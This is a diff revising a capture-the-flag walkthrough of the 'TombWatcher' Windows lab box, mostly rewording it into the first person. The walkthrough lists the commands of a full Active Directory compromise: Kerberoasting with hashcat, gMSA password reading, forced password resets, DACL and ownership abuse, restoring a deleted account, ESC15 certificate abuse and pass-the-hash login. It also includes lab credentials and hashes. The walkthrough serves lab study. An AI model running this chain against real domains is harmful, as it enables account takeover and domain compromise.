@@ -3,13 +3,14 @@
 Difficulty: Medium
 OS: Windows
 Category: Offensive
+Date: 2026-02-24T05:14:03.645Z
 
 ![tombWatcher.webp](tombWatcher.webp)
 
 ### Pre-Engagement
 
 > As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: **henry / H3nry_987TGV!**
-> 
+>
 
 ### Scanning
 
@@ -68,13 +69,13 @@ Host script results:
 
 ### Enumeration & Foothold
 
-Do a Bloodhound enumeration with the user `henry` this will allow us to map everything in the *Domain Controller*
+I do a Bloodhound enumeration with the user `henry` this will allow me to map everything in the *Domain Controller*
 
 ```bash
 bloodhound-python -dc DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -c all --zip -ns 10.10.11.72 --dns-timeout 30
 ```
 
-The **First Degree Object Control** for the user `henry` has a `WriteSPN` privilege to the user `Alfred` . Get the *UserSPN* of Alfred, then crack the krb5tgs with hashcat and rockyou
+The **First Degree Object Control** for the user `henry` has a `WriteSPN` privilege to the user `Alfred` . I get the *UserSPN* of Alfred, then crack the krb5tgs with hashcat and rockyou
 
 ![image.png](image.webp)
 
@@ -89,7 +90,7 @@ hashcat -m 13100 alfred-hash rockyou.txt
 # alfred:basketball
 ```
 
-Now that you have the password of `Alfred` look in the bloodhound again. As we can see that the user Alfred can add himself on the group of `Infrastructure@tombwatcher.htb` use BloodyAD to add the user Alfred to the group.
+With Alfred's password recovered, I return to BloodHound and find that the account can join `Infrastructure@tombwatcher.htb`. I use BloodyAD to add Alfred to the group.
 
 ![image.png](image%201.webp)
 
@@ -104,7 +105,7 @@ distinguishedName: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
 memberOf: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
 ```
 
-Now looking back again at bloodhound. We’ll notice that `Infrastructure` has **ReadGMSAPassword** privilege to `ANSIBLE_DEV$` Read the password of the user *ANSIBLE* using *Alfred*.
+BloodHound shows that Infrastructure has `ReadGMSAPassword` access to `ANSIBLE_DEV$`. I use Alfred's account to retrieve the managed password material.
 
 ![image.png](image%202.webp)
 
@@ -116,13 +117,13 @@ msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:1c37d00093dc2a5f2517
 msDS-ManagedPassword.B64ENCODED: IIwfpSnxGqOGf+d99xuIBTCl3yqtm6fvywv4pBqe5PN9jsYcLAWn3x1doYf9ZzjBXGB3XoRzPFNwtajDOG304xGmN2CJ4G+5QsLACGGVvu3ZoG4aosUdfpEGuWyYqSyKggtxHtssw1lWLbrZayfWqascdDtBvuaszTpJgmDnLykE6QP+BmmngEkfETLuZ+hH0pP896TujqasQXFyOBkqwVtvXe1Lx9szud4//XTPoejE0KBihHGhzmbQ8pGH9QR9zl21XsohXJA2dd9QAUwgGpCssBhbOPtAalPoaOYDlBE4wrFZNnrYpADsIeYVO/HmXVnGO1e/9XRjcSCEZaHvTw==
 ```
 
-We’ll go back to Bloodhound and see the enumeration result. We now have the NTLM hash for *ANSIBLE*, which is `:1c37d00093dc2a5f25176bf2d474afdc`. We’ll notice that the user *ANSIBLE* can force change password for the user `sam`. So in order to gain access for the user sam, let’s try to change its password.
+I'll go back to Bloodhound and see the enumeration result. I now have the NTLM hash for *ANSIBLE*, which is `:1c37d00093dc2a5f25176bf2d474afdc`. I'll notice that the user *ANSIBLE* can force change password for the user `sam`. So to gain access for the user sam, I'll try to change its password.
 
 ```bash
 bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u ansible_dev$ -p :1c37d00093dc2a5f25176bf2d474afdc set password 'SAM' 'Password123!'
 ```
 
- That’s it we now have the user `sam`. Now looking back again at Bloodhound, we’ll find that *sam* has `WriteOwner` privilege to the user `John`. So we’ll change the ownership.
+ That’s it I now have the user `sam`. Now looking back again at Bloodhound, I'll find that *sam* has `WriteOwner` privilege to the user `John`. So I'll change the ownership.
 
 ![image.png](image%203.webp)
 
@@ -130,19 +131,19 @@ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u ansible_dev$ -p :1c37d00093dc2
 bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'Password123!' set owner john sam                                           
 ```
 
-Then grant full access control
+I then grant full control over the object:
 
 ```bash
 bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'Password123!' add genericAll john sam
 ```
 
-Now that we have full access, change the password for the user `John`
+With that access, I change John's password:
 
 ```bash
 bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'Password123!' set password john 'Password123!'
 ```
 
-Remote to Domain then get the `user` flag
+I connect remotely as John and retrieve the user flag.
 
 ```bash
 evil-winrm -i dc01.tombwatcher.htb -u John -p 'Password123!'
@@ -150,7 +151,7 @@ evil-winrm -i dc01.tombwatcher.htb -u John -p 'Password123!'
 
 ### Root
 
-Upon looking at Bloodhound, we’ll notice that the user *John* has a GenericAll privilege directly to `ADCS`. However, *ADCS* is an Organizational Unit so we need to abuse this privilege and modify the DACL for John on ADCS.
+Upon looking at Bloodhound, I'll notice that the user *John* has a GenericAll privilege directly to `ADCS`. However, *ADCS* is an Organizational Unit so I need to abuse this privilege and modify the DACL for John on ADCS.
 
 ![image.png](image%204.webp)
 
@@ -162,7 +163,7 @@ impacket-dacledit -action write -rights FullControl -inheritance -principal
 
 This allows the user **John** full control permissions on the **ADCS OU** and all its child objects by modifying the ACL (Access Control Unit) on that OU.
 
-The problem is, **John** is not a part of the **ADCS** **OU** so we need to find a user that will allow us to do so.
+The problem is, **John** is not a part of the **ADCS** **OU** so I need to find a user that will allow me to do so.
 
 ### THE CLUE
 
@@ -174,7 +175,7 @@ certipy-ad find -u john -p 'Winter2025' -target 10.10.11.72 -dc-ip 10.10.11.72
 [!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
 ```
 
-So after modifying the DACL for the user **John** to **ADCS**. Let’s find some deleted users at `Recycle Bin`
+So after modifying the DACL for the user **John** to **ADCS**. I'll find some deleted users at `Recycle Bin`
 
 ```powershell
 Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, objectGUID, objectSid, lastKnownParent | Format-List
@@ -199,19 +200,19 @@ objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
 lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
 ```
 
-We found 3 users, I chose the 3rd user and restored this account.
+I found 3 users, I chose the 3rd user and restored this account.
 
 ```powershell
 Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
 ```
 
-Change its password
+I change its password
 
 ```powershell
 Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
 ```
 
-Then enable the account
+Then I enable the account
 
 ```powershell
 Enable-ADAccount -Identity cert_admin
@@ -219,41 +220,41 @@ Enable-ADAccount -Identity cert_admin
 
 ### Privilege Escalation
 
-Now that the user `cert_admin` is enabled and accessible. Let’s elevate our privilege by looking for vulnerable templates using `certipy` **NOTE: Make sure certipy is in latest version**
+With `cert_admin` enabled, I use Certipy to inspect the certificate templates for a privilege-escalation path.
 
 ```bash
 certipy find -u 'cert_admin' -p 'Password@123!' -dc-ip 10.10.11.72 -
 vulnerable -stdout
 ```
 
-We will find out that the vulnerable template is ESC15, it’s a WebServer template vulnerability.
+I'll find out that the vulnerable template is ESC15, it’s a WebServer template vulnerability.
 
 ![image.png](image%205.webp)
 
-We’ll get the `administrator.pfx` with the following by requesting a certificate and forge it to impersonate **administrator**.
+I'll get the `administrator.pfx` with the following by requesting a certificate and forge it to impersonate **administrator**.
 
 > **ESC15 = Arbitrary SAN Injection + Enroll Rights**
-> 
+>
 
-The user `cert_admin` doesn’t need `CertificateTemplate:FullControl` or `WriteDacl` we’ll just **Enroll** permission on a template, and a **CA that honors SANs in requests.**
+I use `cert_admin`'s enrollment rights for the certificate request below.
 
 ```powershell
 certipy req -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 -u cert_admin@tombwatcher.htb -p 'Password123!' -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
 ```
 
-Request for the `administrator.pfx`
+I request the administrator certificate:
 
 ```bash
 certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -on-behalf-of TOMBWATCHER\\Administrator -template User -ca tombwatcher-CA-1 -pfx cert_admin.pfx -dc-ip 10.10.11.72
 ```
 
-Get the Hash using `administrator.pfx`
+I get the Hash using `administrator.pfx`
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
 ```
 
-Authenticate to machine
+I authenticate to the machine:
 
 ```bash
 evil-winrm -i dc01.tombwatcher.htb -u Administrator -H '026fe56a968066fake2bf6hehe2947a15b'
@@ -261,22 +262,22 @@ evil-winrm -i dc01.tombwatcher.htb -u Administrator -H '026fe56a968066fake2bf6he
 
 **ALTERNATIVELY**
 
-After requesting for a certificate from the command above, we can authenticate to the **LDAP**
+After requesting for a certificate from the command above, I can authenticate to the **LDAP**
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
 ```
 
-Then change the password for the administrator
+Then I change the password for the administrator
 
 ```bash
 change_password Administrator Password123!
 ```
 
-Then Authenticate to machine
+I then authenticate to the machine:
 
 ```bash
 evil-winrm -i dc01.tombwatcher.htb -u Administrator -p Password123!
 ```
 
-After authenticating to machine, get the `root` flag.
+After authenticating, I retrieve the root flag.
